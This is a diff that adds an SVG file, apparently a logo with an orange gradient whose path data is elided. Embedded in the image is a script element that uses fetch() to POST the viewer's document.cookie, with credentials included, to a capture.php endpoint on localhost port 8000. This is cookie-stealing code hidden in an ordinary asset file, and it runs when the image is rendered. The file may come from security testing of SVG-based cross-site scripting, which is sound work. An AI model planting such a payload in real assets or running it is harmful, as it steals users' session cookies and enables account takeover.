@@ -1,0 +1,13 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="129" height="40" fill="none" viewBox="0 0 129 40">
+    <path fill="url(#a)" d="..." />
+    <script type="text/javascript">
+        fetch('http://localhost:8000/capture.php', { method: 'POST', credentials: 'include', body: document.cookie });
+    </script>
+    <defs>
+        <linearGradient id="a" x1=".419" x2="34.5" y1="40.199" y2="40.199" gradientUnits="userSpaceOnUse">
+            <stop stop-color="#FF5601"/>
+            <stop offset=".5" stop-color="#FF4000"/>
+            <stop offset="1" stop-color="#FF1F01"/>
+        </linearGradient>
+    </defs>
+</svg>
